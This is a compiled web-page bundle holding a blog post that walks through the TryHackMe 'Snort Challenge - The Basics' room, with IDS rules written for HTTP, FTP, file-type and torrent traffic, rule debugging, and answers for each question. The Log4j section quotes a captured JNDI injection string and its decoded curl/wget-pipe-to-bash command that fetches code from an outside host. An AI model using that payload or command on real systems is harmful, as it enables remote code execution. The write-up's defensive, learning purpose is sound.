"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[7538],{4215:e=>{e.exports=JSON.parse('{"permalink":"/docs/blog/2023/06/02/tryhackme-snort-challenges-1","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-06-02-tryhackme-snort-challenges-1.md","source":"@site/blog/2023-06-02-tryhackme-snort-challenges-1.md","title":"Try Hack Me, Snort Challenges, The Basics","description":"This is my first Try Hack Me write up, the room is Snort Challenge, The Basics.","date":"2023-06-02T00:00:00.000Z","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/blog/tags/tryhackme"},{"inline":true,"label":"snort","permalink":"/docs/blog/tags/snort"}],"readingTime":19.14,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Try Hack Me, Snort Challenges, The Basics","authors":["mark-burton"],"tags":["tryhackme","snort"],"description":"This is my first Try Hack Me write up, the room is Snort Challenge, The Basics.","date":"2023-06-02"},"unlisted":false,"prevItem":{"title":"Try Hack Me, OpenVAS","permalink":"/docs/blog/2023/06/19/tryhackme-openvas"},"nextItem":{"title":"Brew Day","permalink":"/docs/blog/2023/04/22/brew-day"}}')},28453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>o});var s=n(96540);const a={},r=s.createContext(a);function i(e){const t=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:t},e.children)}},48878:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>u,frontMatter:()=>i,metadata:()=>s,toc:()=>h});var s=n(4215),a=n(74848),r=n(28453);const i={title:"Try Hack Me, Snort Challenges, The Basics",authors:["mark-burton"],tags:["tryhackme","snort"],description:"This is my first Try Hack Me write up, the room is Snort Challenge, The Basics.",date:"2023-06-02"},o=void 0,l={authorsImageUrls:[void 0]},h=[{value:"Snort Challenge - The Basics  This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.  ### Task 1 - Introduction  Start the machine, that&#39;s it.  ### Task 2 - Writing IDS Rules (HTTP)  Let&#39;s create IDS Rules for HTTP traffic!",id:"snort-challenge---the-basics--this-is-the-first-time-i-have-written-up-a-try-hack-me-challenge-on-day-161-of-my-hacking-streak-it-is-primarily-to-keep-track-of-the-challenge-as-i-work-through-it-if-you-find-this-i-hope-it-helps---task-1---introduction--start-the-machine-thats-it---task-2---writing-ids-rules-http--lets-create-ids-rules-for-http-traffic",level:2},{value:"Notes  In the previous channel task 9 covers the structure of a snort rule which is summarized as  Action | Protocol | Source IP | Source Port | Direction | Dest IP | Dest Port | Options  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Alert  | TCP  |  |  |  |  |  | Msg  Drop  | UDP  |  ANY  |  ANY  |  &lt;&gt;  |  ANY  |  ANY  | Reference  Reject | IMCP  |  |  |  |  |  | SID  |  |  |  |  |  |  | Rev  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Rule Header  | Rule Options  The hint says to make 2 rules, 1 rule for port 80 source and port 80 destination,  ``` bash",id:"notes--in-the-previous-channel-task-9-covers-the-structure-of-a-snort-rule-which-is-summarized-as--action--protocol--source-ip--source-port--direction--dest-ip--dest-port--options----------------------------------------------------------------------------------------alert---tcp-------------msg--drop---udp----any----any--------any----any---reference--reject--imcp-------------sid---------------rev----------------------------------------------------------------------------------------rule-header---rule-options--the-hint-says-to-make-2-rules-1-rule-for-port-80-source-and-port-80-destination---bash",level:4}];function c(e){const t={code:"code",h2:"h2",h4:"h4",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h2,{id:"snort-challenge---the-basics--this-is-the-first-time-i-have-written-up-a-try-hack-me-challenge-on-day-161-of-my-hacking-streak-it-is-primarily-to-keep-track-of-the-challenge-as-i-work-through-it-if-you-find-this-i-hope-it-helps---task-1---introduction--start-the-machine-thats-it---task-2---writing-ids-rules-http--lets-create-ids-rules-for-http-traffic",children:"Snort Challenge - The Basics  This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.  ### Task 1 - Introduction  Start the machine, that's it.  ### Task 2 - Writing IDS Rules (HTTP)  Let's create IDS Rules for HTTP traffic!"}),"\n",(0,a.jsx)(t.p,{children:'Answer the questions below\nNavigate to the task folder.  Use the given pcap file.  Write rules to detect "all TCP port 80 traffic" packets in the given pcap file.  #### Question 1\nWhat is the number of detected packets?  Note: You must answer this question correctly before answering the rest of the questions in this task.  :::info\nHint: You need to investigate inbound and outbound traffic on port 80. Writing two simple rules will help you.\n:::'}),"\n",(0,a.jsx)(t.h4,{id:"notes--in-the-previous-channel-task-9-covers-the-structure-of-a-snort-rule-which-is-summarized-as--action--protocol--source-ip--source-port--direction--dest-ip--dest-port--options----------------------------------------------------------------------------------------alert---tcp-------------msg--drop---udp----any----any--------any----any---reference--reject--imcp-------------sid---------------rev----------------------------------------------------------------------------------------rule-header---rule-options--the-hint-says-to-make-2-rules-1-rule-for-port-80-source-and-port-80-destination---bash",children:"Notes  In the previous channel task 9 covers the structure of a snort rule which is summarized as  Action | Protocol | Source IP | Source Port | Direction | Dest IP | Dest Port | Options  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Alert  | TCP  |  |  |  |  |  | Msg  Drop  | UDP  |  ANY  |  ANY  |  <>  |  ANY  |  ANY  | Reference  Reject | IMCP  |  |  |  |  |  | SID  |  |  |  |  |  |  | Rev  --------|----------|-----------|-------------|-----------|---------|-----------|-----------  Rule Header  | Rule Options  The hint says to make 2 rules, 1 rule for port 80 source and port 80 destination,  ``` bash"}),"\n",(0,a.jsx)(t.p,{children:'alert tcp any 80 <> any any (msg: "port 80 origin"; sid: 100001; rev: 1;)\nalert tcp any any <> any 80 (msg: "port 80 destination"; sid: 100002; rev:1;)'}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-Then",metastring:"run snort with the local rules",children:'``` bash\nsnort -c local.rules -A full -l . -r mx-3.pcap\n```  ``` bash\nAction Stats:  Alerts:  ??? ( 71.304%)  Logged:  ??? ( 71.304%)\n```  #### Answer\n&gt; 328 [Reveal Answer](#) #### Question 2\n> Investigate the log file.  What is the destination address of packet 63?  I got to the answer using the following snort command.  ``` bash\nsnort -c local.rules -r mx-3.pcap -A console -n 63\n```  But that isn\'t what the question asks, it specifically says `Investigate the log file.` so to read the log file instead use the command below.  ``` bash\nsudo snort -r snort.log.1680776108 -n 64\n```  ``` bash\n0513-10:17:10.205385  [**] [1:100001:1] port 80 origin [**] [Priority: 0] 65.208.228.223:80 -> 145.254.160.237:3372\n```  #### Answer\n> 145.254.160.237 [Reveal Answer](#) #### Question 3  Investigate the log file.  What is the ACK number of packet 64?  ##### Notes  Similar to the previous question.  ``` bash\nsudo snort -r snort.log.1686080304 -n 64\n```  ``` bash\nWARNING: No preprocessors configured for policy 0.\n0513-10:17:09.123830 65.208.228.223:80 -> 145.254.160.237:3372\nTCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF\n***A**** Seq: 0x114C66F0  Ack: 0x????????  Win: 0x1920  TcpLen: 20\n```  #### Answer\n> 0x38AFFFF3 [Reveal Answer](#) #### Question 4  Investigate the log file.  What is the SEQ number of packet 62?  ``` bash\nsudo snort -r snort.log.1686080304 -n 62\n```  ``` bash\nWARNING: No preprocessors configured for policy 0.\n0513-10:17:09.123830 145.254.160.237:3372 -> 65.208.228.223:80\nTCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF\n***A**** Seq: 0x????????  Ack: 0x114C66F0  Win: 0x25BC  TcpLen: 20\n```  #### Answer\n> 0x38AFFFF3 [Reveal Answer](#) #### Question 5  Investigate the log file.  What is the TTL number of packet 65?  ``` bash\nsudo snort -r snort.log.1686080304 -n 65\n```  ``` bash\nWARNING: No preprocessors configured for policy 0.\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20  ```  #### Answer\n> 128 [Reveal Answer](#) #### Question 6  Investigate the log file.  What is the source IP number of packet 65?  ``` bash\nsudo snort -r snort.log.1686080304 -n 65\n```  ``` bash\nWARNING: No preprocessors configured for policy 0.\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20\n```  #### Answer\n> 145.254.160.237 [Reveal Answer](#) #### Question 7  Investigate the log file.  What is the source port of packet 65?  ``` bash\nsudo snort -r snort.log.1686080304 -n 65\n```  ``` bash\nWARNING: No preprocessors configured for policy 0.\n0513-10:17:09.324118 ???.???.???.???:???? -> 65.208.228.223:80\nTCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF\n***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20\n```  #### Answer\n> 3372 [Reveal Answer](#) ### Task 3 - Writing IDS Rules (FTP)  Let\'s create IDS Rules for FTP traffic!\nAnswer the questions below\nNavigate to the task folder.  Use the given pcap file.  Write rules to detect "all TCP port 21"  traffic in the given pcap.  ``` bash\nalert tcp any 21 &lt;> any any (msg: "port 21 origin"; sid: 100001; rev: 1;)\nalert tcp any any &lt;&gt; any 21 (msg: "port 21 destination"; sid: 100002; rev:1;)\n```  ``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Question 1  What is the number of detected packets?  #### Answer\n&gt; 614 [Reveal Answer](#) #### Question 2  Investigate the log file.  What is the FTP service name?  #### Answer\n> Microsoft FTP Service [Reveal Answer](#) #### Question 3  **Clear the previous log and alarm files.**  Deactivatecomment on the old rules.  Write a rule to detect failed FTP login attempts in the given pcap.  What is the number of detected packets?  ##### notes  I know from mistyping a FTP login enough times that 530 is the code for a failed FTP login.  Looking at the previous log I can see entries like `530 User admin cannot log in.`  So from the previous channel, **Payload Detection Rule Options**, it looks like I can use the `content:` to search for the 530.  ``` bash\nalert tcp any 21 &lt;> any any (msg: "port 21 origin"; content:"530 "; sid: 100001; rev: 1;)\nalert tcp any any &lt;&gt; any 21 (msg: "port 21 destination"; content:"530 "; sid: 100002; rev:1;)\n```  This gives the answer 82 which is not correct.  :::info\nHint: Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic. \n:::\nSo the hint helps, the rule should only be for inbound.  ``` bash\nalert tcp any 21 &lt;&gt; any any (msg: "port 21 origin"; content:"530 "; sid: 100001; rev: 1;)\n```  Run snort again to read the pcap with the new rule\n``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n&gt; 41 [Reveal Answer](#) #### Question 4  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect successful FTP logins in the given pcap.  What is the number of detected packets?  ##### Notes  Similar to the last quesiton but the code is 230  ``` bash\nalert tcp any 21 &lt;&gt; any any (msg: "port 21 origin"; content:"230 "; sid: 100001; rev: 1;)\n```  Run snort again to read the pcap with the new rule\n``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n> 1 [Reveal Answer](#) #### Question 5  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password.  What is the number of detected packets?  ##### Notes\nLooking at the output from the rule in question 1 there are several entries for `331 Password required for fred.` so I tried a rule for 331 in the body, same as the previous question it only makes sense to look for inbound traffic.  ``` bash\nalert tcp any 21 &lt;&gt; any any (msg: "port 21 origin"; content:"331 "; sid: 100001; rev: 1;)\n```  Run snort again to read the pcap with the new rule\n``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n> 42 [Reveal Answer](#) #### Question 6  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect failed FTP login attempts with "Administrator" username but a bad password or no password.  What is the number of detected packets?  ##### Notes  This builds on the previous answers, so a rule like this could work  ``` bash\nalert tcp any any &lt;> any 21 (msg: "port 21 destination"; content:"331 Password required for Administrator"; sid: 100001; rev: 1;)\n```  But that is a kind of basic inflexible way to achieve it, lets make it more complex with the aid of a regex  ``` bash\nalert tcp any any &lt;&gt; any 21 (msg: "port 21 destination"; pcre:"(331).*(administrator)ix"; sid: 100001; rev: 1;)\n```  Run snort again to read the pcap with the new rule\n``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n&gt; 7 [Reveal Answer](#) ### Task 3 - Writing IDS Rules (PNG)  Let\'s create IDS Rules for PNG files in the traffic!  #### Question 1  Use the given pcap file.  Write a rule to detect the PNG file in the given pcap.  Investigate the logs and identify the software name embedded in the packet.  ##### Notes  I could not figure this out from the channel, I tried a simple rule like  ``` bash\nalert tcp any any -> any any (content:"png"; msg:"PNG";sid:10002; rev:1;)\n```  It gave some results but nothing useful to answer the question.  After some googling and trying to avoid other writeups I came across this article on [asecuritysite.com](https:/asecuritysite.comforensicssnort?fname=with_pdf.pcap&rulesname=rulessig.rules) which included the rule  ``` bash\nalert tcp any any -> any any (content:"|89 50 4E 47|"; msg:"PNG";sid:10002)\n```  I remember from a previous channel that the more certain way to identify a file rather then trusting the file extension is the files magic number or magic bytes, for png that is `89 50 4E 47`.  With that rule in place run snort to read the pcap with the new rule\n``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n> adobe imageready [Reveal Answer](#) #### Question 2  **Clear the previous log and alarm files.**  Deactivatecomment on the old rule.  Write a rule to detect the GIF file in the given pcap.  Investigate the logs and identify the image format embedded in the packet.  ##### Notes  Based on the previous question I assume we are looking for the magic bytes for gif, that can be `47 49 46 38 37 61` for GIF87a or `47 49 46 38 39 61` for GIF89a.  Change the previous rule slightly and  ``` bash\nalert tcp any any -> any any (content:"|47 49 46 38 39 61|"; msg:"PNG";sid:10002)\n```  With that rule in place run snort to read the pcap with the new rule  ``` bash\nsnort -c local.rules -A full -l . -r ftp-png-gif.pcap\n```  #### Answer\n> GIF89a [Reveal Answer](#) ### Task 5 - Writing IDS Rules (Torrent Metafile)  Let\'s create IDS Rules for torrent metafiles in the traffic!  #### Question 1  Use the given pcap file.  Write a rule to detect the torrent metafile in the given pcap.  ##### Notes  A torrent meta file has an extension of `.torrent` lets see if that finds anything.  ``` bash\nalert tcp any any -> any any (content:".torrent"; msg:"PNG";sid:10002)\n```  With that rule in place run snort to read the pcap with the new rule  ``` bash\nsnort -c local.rules -A full -l . -r torrent.pcap\n```  Seems to work.  #### Answer\n> 2 [Reveal Answer](#) #### Question 2  Investigate the logalarm files.  What is the name of the torrent application?  ##### Notes  This is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\n\ufffd\u9950^V\ufffd^K\ufffdrP^X"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\nAccept: application?-??????????\nAccept-Encoding: gzip\nUser-Agent: RAZA 2.1.0.0\nHost: ????????.??????????.???:2710\nConnection: Keep-Alive\n```  #### Answer\n> bittorrent [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?  ##### Notes  Again this is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\n\ufffd\u9950^V\ufffd^K\ufffdrP^X"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\nAccept: application?-??????????\nAccept-Encoding: gzip\nUser-Agent: RAZA 2.1.0.0\nHost: ????????.??????????.???:2710\nConnection: Keep-Alive\n```  #### Answer\n> applicationx-bittorrent [Reveal Answer](#) #### Question 4  Investigate the logalarm files.  What is the hostname of the torrent metafile?  ##### Notes  Again this is just a `nano snort.log.1686496369` your log file name will be different.  The output will be something like  ``` bash\n\ufffd\xf2\ufffd^B^@^D^@^@^@^@^@^@^@^@^@\ufffd^E^@^@^A^@^@^@\ufffd\ufffd\ufffdB\ufffd0^N^@\ufffd^A^@^@\ufffd^A^@^@\ufffd\ufffd ^@^>\n\ufffd\u9950^V\ufffd^K\ufffdrP^X"8\ufffd^@^@^@GET announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED>\nAccept: application?-??????????\nAccept-Encoding: gzip\nUser-Agent: RAZA 2.1.0.0\nHost: ????????.??????????.???:2710\nConnection: Keep-Alive\n```  #### Answer\n> tracker2.torrentbox.com [Reveal Answer](#) ### Task 6 - Troubleshooting Rule Syntax Errors  Let\'s troubleshoot rule syntax errors!  In this section, you need to fix the syntax errors in the given rule files.  You can test each ruleset with the following command structure;  ``` bash\nsudo snort -c local-X.rules -r mx-1.pcap -A console\n```  #### Question 1  Fix the syntax error in local-1.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-1.rules` is;  ``` bash\nalert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)\n```  Running snort with the provided command gives the following error;  ``` bash\nInitializing rule chains...\nERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)\n>>any(msg:\n> >^\n> ```  This is a missing space between any and the opening bracket, the fixed rule is;  ``` bash\nalert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)\n```  #### Answer\n> 16 [Reveal Answer](#) #### Question 2  Fix the syntax error in local-2.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-2.rules` is;  ``` bash\nalert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)\n```  Running snort with the provided command gives the following error;  ``` bash\nInitializing rule chains...\nERROR: local-2.rules(8) Port value missing in rule!\nFatal Error, Quitting..\n```  This time the port number is missing from the origin part of the rule, the fixed rule is;  ``` bash\nalert tcp any any -> any any(msg: "Troubleshooting 2"; sid:1000001; rev:1;)\n```  #### Answer\n> 68 [Reveal Answer](#) #### Question 3  Fix the syntax error in local-3.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-3.rules` is;  ``` bash\nalert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)\n```  Running snort with the provided command gives the following error;  ``` bash\nInitializing rule chains...\nERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.\nFatal Error, Quitting..\n```  This time the tells us the same SID is used in 2 different rules, the fixed rule is;  ``` bash\nalert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)\n```  #### Answer\n> 87 [Reveal Answer](#) #### Question 4  Fix the syntax error in local-4.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-4.rules` is;  ``` bash\nalert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)\n```  Running snort with the provided command gives the following error;  ``` bash\nInitializing rule chains...\nERROR: local-4.rules(9) Unmatch quote in rule option \'msg\'.\nFatal Error, Quitting..\n```  The error is a little misleading and it is easier to see the problem with the syntax highlighting, rather than it being an unmatched quote it is a colon instead of a semi-colon after msg in the second rule. There is a second issue which is the same as the previous question, the SID is the same in both rules, the fixed rule is;  ``` bash\nalert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)\n```  #### Answer\n> 90 [Reveal Answer](#) #### Question 5  Fix the syntax error in local-4.rules file and make it work smoothly.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-5.rules` is;  ``` bash\nalert icmp any any &lt;> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert icmp any any <- any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)\nalert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)\n```  Running snort with the provided command gives the following error;  ``` bash\nInitializing rule chains...\nERROR: local-5.rules(9) Illegal direction specifier: &lt;-\nFatal Error, Quitting..\n```  From the previous channel I know that snort does not have a `&lt;-` operator, since rule 2 is any ip and port in either direction is assume `&lt;&gt;` is the correct operator. There is a second problem in the second rule, the separator between the sid name and the value is a semi-colon instead of a colon. Finally a third problem in the 3rd rule, the separator between msg and sid is again a colon rather than semi-colon, the fix rule is;  ``` bash\nalert icmp any any &lt;&gt; any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)\nalert icmp any any &lt;&gt; any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)\nalert tcp any any -&gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)\n```  #### Answer\n&gt; 155 [Reveal Answer](#) #### Question 6  Fix the logical error in local-6.rules file and make it work smoothly to create alerts.  What is the number of the detected packets?  ##### Notes  The rule defined in `local-6.rules` is;  ``` bash\nalert tcp any any &lt;&gt; any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001; rev:1;)\n```  This time there is no error, but the rule returns no alerts.  The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting `67 65 74` into a hex to ascii convertor returns `get`.  I didn\'t see the answer so used the hint.  :::info\nHint: Case sensitivity matters! Use the capitals or nocase! \n:::\nNow the logical error is a little clearer, the content is looking for `get` but http verbs are generally uppercase `GET`.  The hint explains to add the nocase or use uppercase letters in the content, so there are 2 possible rules that can be used;  ``` bash\nalert tcp any any &lt;&gt; any 80  (msg: "GET Request Found"; content:"|67 65 74|"; nocase; sid: 100001; rev:1;)\n```  or  ``` bash\nalert tcp any any &lt;&gt; any 80  (msg: "GET Request Found"; content:"|47 45 54|"; sid: 100001; rev:1;)\n```  #### Answer\n&gt; 2 [Reveal Answer](#) #### Question 7  Fix the logical error in local-7.rules file and make it work smoothly to create alerts.  What is the name of the required option:  ##### Notes  The rule defined in `local-7.rules` is;  ``` bash\nalert tcp any any &lt;> any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)\n```  Again there is no error, but the rule returns 9 alerts while the answer is 3 digits.  The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting `2E 68 74 6D 6C` into a hex to ascii convertor returns `.html`.  I didn\'t see the answer so used the hint.  :::info\nHint: Rules without messages doesn\'t make sense! \n:::\nThat is annoying, all it needs is a message.  ``` bash\nalert tcp any any &lt;&gt; any 80  (msg: "HTML file"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)\n```  #### Answer\n&gt; msg [Reveal Answer](#) ### Task 7 - Using External Rules (MS17-010)  Let\'s use external rules to fight against the latest threats!  Use the given pcap file.  #### Question 1  Use the given rule file (local.rules) to investigate the ms1710 exploitation.  What is the number of detected packets?  #### Answer\n> 25154 [Reveal Answer](#) #### Question 2  **Clear the previous log and alarm files.**  Use local-1.rules empty file to write a new rule to detect payloads containing the "\\IPC$" keyword.  What is the number of detected packets?  ##### Notes  The backslash causes problems, so once the string has been converted to hex I had the following rule:  ``` bash\nalert tcp any any &lt;&gt; any any  (msg: "\\IPC$"; content:"|5c 49 50 43 24|"; sid: 100001; rev:1;)\n```  #### Answer\n> 12 [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What is the requested path?  ##### Notes  The snort log has entries like  ```\n^@^@^@^@^@[\ufffdSMBu^@^@^@^@^X^A ^@^@^@^@^@^@^@^@^@^@K^@^H\ufffd^^D\ufffd^@^@^@^@^@^A^@^\\^@^@\\\\192.168.116.138\\IPC$^@????^@TH_REPLACE\n```  #### Answer\n> smb\\\\192.168.116.138\\IPC$ [Reveal Answer](#) #### Question 4  What is the CVSS v2 score of the MS17-010 vulnerability?  ##### Notes  https:/www.cvedetails.comcveCVE-2017-0144/  #### Answer\n> 9.3 [Reveal Answer](#) ### Task 8 - Using External Rules (Log4j)  Let\'s use external rules to fight against the latest threats!  Use the given pcap file.  #### Question 1  Use the given rule file (local.rules) to investigate the log4j exploitation.  What is the number of detected packets?  #### Answer\n> 26 [Reveal Answer](#) #### Question 2  Investigate the logalarm files.  How many rules were triggered?.  #### Answer\n> 4 [Reveal Answer](#) #### Question 3  Investigate the logalarm files.  What are the first six digits of the triggered rule sids?  #### Answer\n> 210037 [Reveal Answer](#) #### Question 4  Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.  What is the number of detected packets?  ##### Notes  :::info\nHint: The "dsize" option will help you to filter the payload size. \n:::\nA little more info on [dsize syntax](http:/manual-snort-org.s3-website-us-east-1.amazonaws.comnode33.html#SECTION00467000000000000000)  The rule can look like the below;  ``` bash\nalert tcp any any &lt;> any any (msg: "Between 770 and 885 bytes"; dsize:770&lt;&gt;855; sid: 100001; rev:1;)\n```  Run snort  ``` bash\nsnort -c local-1.rules -A full -l . -r log4j.pcap\n```  #### Answer\n&gt; 41 [Reveal Answer](#) #### Question 5  Investigate the logalarm files.  What is the name of the used encoding algorithm?  ##### Notes  Quick read of the log file and I noticed this  > ^v^D\ufffdc\ufffd\ufffd\ufffdGET ?x=$\\\\{jndi:ldap:/45.155.205.233:12344BasicCommand??????KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=\\} HTTP1.1  #### Answer\n> Base64 [Reveal Answer](#) #### Question 6  Investigate the logalarm files.  What is the IP ID of the corresponding packet?  ##### Notes  I don\'t know why this is the answer, it is one of the many entries in the alert file.  #### Answer\n> 62808 [Reveal Answer](#) #### Question 7  Investigate the logalarm files.  Decode the encoded command.  What is the attacker\'s command?  ##### Notes  The Base64 encoded string is part of the url in question 5 `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` it just needs decoding.  #### Answer\n> (curl -s 45.155.205.233:5874162.0.228.253:80||wget -q -O- 45.155.205.233:5874162.0.228.253:80)|bash [Reveal Answer](#) #### Question 8  What is the CVSS v2 score of the Log4j vulnerability?  ##### Notes  [NIST cve-2021-44228](https:/nvd.nist.govvulndetailcve-2021-44228)  #### Answer\n> 9.3  [Reveal Answer](#) ### Conclusion  Congratulations! Are you brave enough to stop a live attack in the [Snort2 Challenge 2](https:/tryhackme.comroomsnortchallenges2) room?  Check back soon for my write up of Snort Challenge 2.\n'})})]})}function u(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}}}]);